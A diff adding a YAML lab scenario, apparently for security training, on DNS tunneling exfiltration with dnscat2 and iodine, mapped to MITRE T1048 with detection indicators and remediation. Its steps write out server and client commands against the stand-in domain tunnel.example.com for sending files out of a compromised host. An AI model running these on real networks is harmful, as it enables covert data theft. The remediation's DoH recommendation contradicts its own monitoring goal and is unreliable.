@@ -1,0 +1,96 @@
+# Category: Data Exfiltration
+name: "DNS Tunneling – Covert Data Exfiltration"
+id: "exfil-dns-tunnel-001"
+category: "exfiltration"
+subcategory: "network_tunnels"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Use DNS queries to exfiltrate data from a compromised network. By encoding
+  data as subdomains and sending DNS requests to a controlled authoritative
+  server, attackers can bypass firewalls that allow DNS outbound traffic.
+
+learning_objectives:
+  - Understand DNS resolution and tunneling techniques
+  - Set up a DNS tunnel server (e.g., dnscat2, iodine)
+  - Use client to send data via DNS queries
+  - Reconstruct exfiltrated data
+
+tools:
+  - dnscat2
+  - iodine
+  - Python (dnslib)
+  - dnschef (for testing)
+
+prerequisites:
+  - Control of a domain and authoritative DNS server
+  - Compromised host that can make DNS queries
+
+steps:
+  - id: "step1"
+    phase: "server_setup"
+    action: "Deploy DNS tunnel server"
+    commands:
+      - "# Install dnscat2"
+      - "ruby dnscat2.rb --domain tunnel.example.com"
+    expected_output: "DNS tunnel server listening"
+    detection: "DNS server logs may show many subdomains"
+
+  - id: "step2"
+    phase: "client_setup"
+    action: "Run DNS tunnel client on target"
+    commands:
+      - "# Download dnscat2 client"
+      - "./dnscat --domain tunnel.example.com"
+      - "# After connection, send data"
+      - "# Use 'file' command to exfiltrate a file"
+    expected_output: "Data transmitted via DNS queries"
+    detection: "Anomalous DNS traffic (long subdomains, high volume)"
+
+  - id: "step3"
+    phase: "data_recon"
+    action: "Reconstruct exfiltrated data on server"
+    commands:
+      - "# On server, receive and reconstruct"
+    expected_output: "Original file retrieved"
+    detection: "N/A"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1048"
+    description: "Exfiltration Over Alternative Protocol"
+  - standard: "NIST SP 800-53"
+    control: "SI-4"
+    description: "Monitoring (detect abnormal DNS)"
+
+detection:
+  network_indicators:
+    - "DNS queries with many subdomains (>50 characters)"
+    - "High rate of DNS requests to a single domain"
+  log_indicators:
+    - "DNS server logs with unique subdomains"
+  endpoint_indicators:
+    - "dnscat or iodine processes"
+
+remediation:
+  immediate:
+    - "Monitor and block DNS queries with suspicious subdomain lengths"
+    - "Use DNS over HTTPS (DoH) to encrypt queries (harder to inspect)"
+  long_term:
+    - "Implement DNS monitoring for tunneling patterns"
+    - "Restrict external DNS resolution to authorized servers"
+
+variables:
+  tunnel_domain: "tunnel.example.com"
+
+assessment_questions:
+  - "How does DNS tunneling bypass firewalls?"
+  - "What are the common signs of DNS tunneling?"
+  - "What is the difference between iodine and dnscat2?"
+
+references:
+  - url: "https://github.com/iagox86/dnscat2"
+    title: "dnscat2"
+  - url: "https://www.ietf.org/rfc/rfc1035.txt"
+    title: "DNS RFC"
